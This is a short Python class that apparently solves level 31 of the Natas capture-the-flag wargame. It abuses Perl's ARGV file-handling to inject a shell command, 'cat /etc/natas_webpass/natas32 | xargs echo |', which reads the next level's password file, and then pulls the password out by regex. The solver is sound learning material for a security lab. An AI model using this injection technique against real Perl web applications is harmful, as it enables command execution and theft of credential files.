import re
from .base_solver import NatasSolver

class Natas31Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Make request with command injection using ARGV trick
            response = self.make_request(
                path="/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |",
                method="POST",
                files=[('file', ('filename', 'anything'))],
                data={'file': 'ARGV'}
            )
            
            # Extract password from response (32 character string)
            match = re.findall(r'[0-9a-zA-Z]{32}', response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas31: {str(e)}")
